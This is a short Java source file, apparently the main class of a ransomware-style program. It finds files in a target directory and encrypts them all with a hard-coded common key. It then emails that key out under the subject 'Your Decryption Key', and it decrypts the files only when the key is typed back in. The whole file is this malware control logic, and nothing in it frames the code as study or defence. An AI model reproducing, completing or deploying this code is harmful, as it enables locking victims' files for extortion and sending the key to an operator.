package main;

import cipher.Cryption;
import cipher.CryptionKeys;
import finder.SearchTarget;
import javafx.application.Application;
import javafx.stage.Stage;
import tools.InputUtility;
import tools.MailSendUtility;

import javax.swing.*;

public class Execute extends Application {

  public static void main(String... halloween) {
    new JFrame().setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    launch(halloween);
  }

  @Override
  public void start(Stage primaryStage) throws Exception {
    SearchTarget searchTarget = new SearchTarget();
    searchTarget.getTargetList()
        .forEach(file -> System.out.println(file.getName()));

    String dirPath = searchTarget.getPath();

    Cryption cryption = new Cryption();
    if (cryption.hasEncryptFlag(dirPath)) {
      cryption.exeDecrypt(searchTarget.getTargetList(), dirPath, InputUtility.textInput());
    } else {
      cryption.exeEncrypt(searchTarget.getTargetList(), dirPath , CryptionKeys.COMMON_KEY);
      MailSendUtility.send("Your Decryption Key", CryptionKeys.COMMON_KEY);
    }
  }
}
